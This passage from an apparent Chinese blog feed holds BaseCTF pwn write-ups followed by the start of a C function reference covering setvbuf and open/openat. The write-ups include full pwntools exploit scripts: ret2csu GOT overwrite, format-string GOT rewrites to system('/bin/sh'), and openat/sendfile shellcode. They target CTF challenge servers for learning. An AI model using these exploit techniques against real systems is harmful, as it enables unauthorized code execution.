&quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push 0x101</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall      </span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx,rsp</span></span><br><span class="line"><span class="string">    mov r10,0x100</span></span><br><span class="line"><span class="string">    push 40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(asm(shellcode))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h2><p>libc-csu，改写got表</p><p>GOT表主要用于在动态链接过程中存储全局变量和函数地址，动态链接器会根据实际加载的动态链接库的地址来填充 GOT 表中的相应条目</p><p>PLT 表用于处理动态链接库中的函数调用。PLT 表中的代码段会通过 GOT 表来实现函数的调用，并且在第一次调用时会触发动态链接器来解析该函数的实际地址并将其存储在 GOT 表中。</p><p>也就是说在调用动态链接库里的函数时先call其plt表再由plt表调用函数对应got表，也就是调用其真实函数地址，plt表起到一个传递的作用</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出，给了libc但是没有泄露基地址的机会所以只能尝试改写现有函数，该题通过改写setvbuf的got表为system的地址来调用system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]-libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>计算出二者之间的偏移为0x30880</p><p>发现配合libc_csu可以改写任意地址的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400658                 add     [rbp-3Dh], ebx</span><br><span class="line">.text:000000000040065B                 nop</span><br><span class="line">.text:000000000040065C                 retn</span><br></pre></td></tr></table></figure><p>控制rbp和rdx的值</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/basectf.png" alt="1"></p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;gz.imxbt.cn&quot;</span>,<span class="number">20452</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">shell=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setvbuf=libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="comment">#offset=shell-setvbuf</span></span><br><span class="line"><span class="comment">#offset=offset&amp;0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">py=-<span class="number">0x30880</span></span><br><span class="line">py=py&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span> <span class="comment">#将高 64 位清零保留低 64 位的补码值确保 py 的值在 64 位无符号整数的范围</span></span><br><span class="line">setvbuf_plt=elf.plt[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_got=elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x601080</span></span><br><span class="line">rdi=<span class="number">0x4006f3</span></span><br><span class="line"></span><br><span class="line">gadget2=<span class="number">0x4006ea</span>  <span class="comment">#rbx rbp r12 r13 r14 15</span></span><br><span class="line">magic=<span class="number">0x400658</span>    <span class="comment">#add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(gadget2)</span><br><span class="line">payload+=p64(py)  <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(setvbuf_got+<span class="number">0x3d</span>) <span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">4</span>  <span class="comment">#pop to --&gt;r12 r13 r14 r15</span></span><br><span class="line">payload+=p64(magic) <span class="comment">#ret--&gt;magic</span></span><br><span class="line">payload+=p64(rdi)+p64(bss)+p64(gets_plt)</span><br><span class="line">payload+=p64(rdi)+p64(bss)+p64(setvbuf_plt)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *0x400682&quot;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="format-string-level0"><a href="#format-string-level0" class="headerlink" title="format_string_level0"></a>format_string_level0</h2><p>vuln程序存在格式化字符串漏洞，会将同目录下的flag文件读入一段缓冲区内</p><p>通过gdb调试发现在printf时<code>R9</code>寄存器存放着，R9为printf输出参数的第5个</p><p>所以直接利用格式化字符输出即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;gz.imxbt.cn&#x27;,20132)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#   [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *0x4013B8&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">target = <span class="number">0x4040B0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%1c%7$na&#x27;</span>+p64(target)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>sleep是为了在gdb启动前程序运行慢一点，防止程序提前关闭执行流</p><h2 id="format-string-level2"><a href="#format-string-level2" class="headerlink" title="format_string_level2"></a>format_string_level2</h2><p>check</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/桌面/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在格式化字符漏洞可以多次利用</p><p>第一次将read函数的got表地址放在栈上泄露出来获取libc版本及其基址</p><p>第二次将printf函数的got表地址改为system的got表地址</p><p>第四次read传入<code>/bin/sh</code>因为是调用的printf(buf)所以更改后就变成了system(‘&#x2F;bin&#x2F;sh’)</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./fmt2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;gz.imxbt.cn&quot;</span>,<span class="number">20726</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./1.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">all_logs = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">params=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">for</span> an_log <span class="keyword">in</span> all_logs:</span><br><span class="line">        success(an_log)</span><br><span class="line">    pid = util.proc.pidof(io)[<span class="number">0</span>]</span><br><span class="line">    gdb.attach(pid, params)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(read_got))</span><br><span class="line">payload =  <span class="string">b&#x27;bbbb%7$s&#x27;</span> + p64(read_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">read_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(system))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="format-string-level3"><a href="#format-string-level3" class="headerlink" title="format_string_level3"></a>format_string_level3</h2><p>check</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>只有一次格式化字符漏洞利用机会，要尝试能够构造二次输入，开了canary每次都会检查是否覆盖了canary覆盖了会跳转到<code>call   __stack_chk_fail@plt &lt;__stack_chk_fail@plt&gt;</code>使进程结束，就联想到如果把这个的got表改为main函数起始地址那么每次溢出了的时候都可以再跳转回main函数一次</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/basectf8.png" alt="1"></p><p>接着第二次将puts的got表放入栈上用%s读出，获得libc基址</p><p>第三次将printf的got表改为system函数的got表</p><p>第四次read传入’&#x2F;bin&#x2F;sh’调用system(‘&#x2F;bin&#x2F;sh’)</p><p>注意因为前三次都要触发<code>call   __stack_chk_fail@plt &lt;__stack_chk_fail@plt&gt;</code>所以要将payload填充到0x110个字节</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">all_logs = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">params=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">for</span> an_log <span class="keyword">in</span> all_logs:</span><br><span class="line">        success(an_log)</span><br><span class="line">    pid = util.proc.pidof(io)[<span class="number">0</span>]</span><br><span class="line">    gdb.attach(pid, params)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;gz.imxbt.cn&quot;</span>,<span class="number">20741</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x04010D0</span></span><br><span class="line">check_got = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">success(check_got)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;-----\n&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;check_got:main_addr&#125;).ljust(<span class="number">0x110</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;-----\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%7$sbbbb&#x27;</span>+p64(puts_got)</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">success(payload)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(puts_addr)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;-----\n&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:sys&#125;).ljust(<span class="number">0x110</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;-----\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>目前还是用fmtstr_payload比较浅显易懂，看网上很多wp都是逐字节写入的，后续可以研究研究</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数合集</title>
      <link href="/2025/04/15/%E5%87%BD%E6%95%B0%E5%90%88%E9%9B%86/"/>
      <url>/2025/04/15/%E5%87%BD%E6%95%B0%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="这篇文章用于记录函数的详细信息"><a href="#这篇文章用于记录函数的详细信息" class="headerlink" title="这篇文章用于记录函数的详细信息"></a>这篇文章用于记录函数的详细信息</h1><h2 id="c"><a href="#c" class="headerlink" title="c"></a>c</h2><h3 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h3><p><code>setbuf</code> 函数用于设置文件流的缓冲区。它允许你指定一个用户提供的缓冲区，用于文件的输入输出操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setbuf</span><span class="params">(FILE *stream, <span class="type">char</span> *buf)</span>;</span><br></pre></td></tr></table></figure><p><code>setbuf</code>只有全缓冲或无缓冲</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td><code>stream</code></td><td>要设置缓冲区的文件流。</td></tr><tr><td><code>buf</code></td><td>用户提供的缓冲区。如果 <code>buf</code> 为 <code>NULL</code>，则禁用缓冲。</td></tr></tbody></table><table><thead><tr><th>文件流</th><th>含义</th></tr></thead><tbody><tr><td><code>stdio</code></td><td>标准输入流</td></tr><tr><td><code>stdout</code></td><td>标准输出流</td></tr><tr><td><code>stderr</code></td><td>标准错误流</td></tr></tbody></table><table><thead><tr><th>缓冲模式</th><th>对应字符</th></tr></thead><tbody><tr><td>无缓冲<code>_IONBF</code></td><td><code>0</code> 或 <code>NULL</code></td></tr><tr><td>全缓冲<code>_IOFBF</code></td><td><code>2</code></td></tr></tbody></table><h3 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setvbuf</span><span class="params">(FILE *stream, <span class="type">char</span> *buf, <span class="type">int</span> mode, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stream：要设置缓冲区的文件流。</span><br><span class="line">buf：用户提供的缓冲区。如果为 NULL，则使用系统分配的缓冲区。</span><br><span class="line">mode：缓冲类型，可以是以下值：</span><br><span class="line">_IOFBF：全缓冲。</span><br><span class="line">_IOLBF：行缓冲。</span><br><span class="line">_IONBF：无缓冲。</span><br><span class="line">size：缓冲区大小。</span><br></pre></td></tr></table></figure><table><thead><tr><th>缓冲模式</th><th>对应字符</th></tr></thead><tbody><tr><td>无缓冲<code>_IONBF</code></td><td><code>0</code> 或 <code>NULL</code></td></tr><tr><td>行缓冲<code>_IOLBF</code></td><td><code>1</code></td></tr><tr><td>全缓冲<code>_IOFBF</code></td><td><code>2</code></td></tr></tbody></table><p><strong>返回值</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：返回0。</span><br><span class="line">失败：返回非零值（通常为 -1）。</span><br></pre></td></tr></table></figure><h3 id="opean"><a href="#opean" class="headerlink" title="opean"></a>opean</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pathname：</span><br><span class="line">指向一个以空字符结尾的字符串，表示要打开的文件或设备的路径名。</span><br><span class="line">路径可以是绝对路径（如 /home/user/file.txt）或相对路径（如 ./file.txt）</span><br><span class="line"></span><br><span class="line">flags：</span><br><span class="line">一个整数，表示打开文件的方式。flags 参数必须包含以下几种模式之一：</span><br><span class="line">0 --&gt;  O_RDONLY：只读模式。</span><br><span class="line">1 --&gt;  O_WRONLY：只写模式。</span><br><span class="line">2 --&gt;  O_RDWR：读写模式。</span><br><span class="line">除了上述基本模式外，还可以结合其他标志使用，通过按位或操作（|）组合：</span><br><span class="line">O_CREAT：如果文件不存在，则创建一个新文件。</span><br><span class="line">O_TRUNC：如果文件已存在且以写模式打开，则将文件长度截断为 0。</span><br><span class="line">O_APPEND：写入时将数据追加到文件末尾。</span><br><span class="line">O_EXCL：与 O_CREAT 一起使用，如果文件已存在，则返回错误。</span><br><span class="line">O_NONBLOCK：非阻塞模式，适用于设备文件或套接字。</span><br><span class="line">O_NOCTTY：如果路径名指向终端设备，不将其作为控制终端。</span><br><span class="line">O_DIRECTORY：要求路径名必须是一个目录。</span><br><span class="line"></span><br><span class="line">mode：</span><br><span class="line">仅在 flags 中包含 O_CREAT 时使用，指定文件的权限模式。</span><br><span class="line">权限模式使用符号常量（如 S_IRUSR、S_IWUSR 等）定义，通常用八进制表示（如 0644）。</span><br><span class="line">如果未指定 O_CREAT，则 mode 参数被忽略。</span><br></pre></td></tr></table></figure><p><strong>返回值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：返回一个非负整数，表示打开的文件描述符。</span><br><span class="line">失败：返回 -1，并设置 errno 以指示错误原因。</span><br></pre></td></tr></table></figure><h3 id="opeanat"><a href="#opeanat" class="headerlink" title="opeanat"></a>opeanat</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 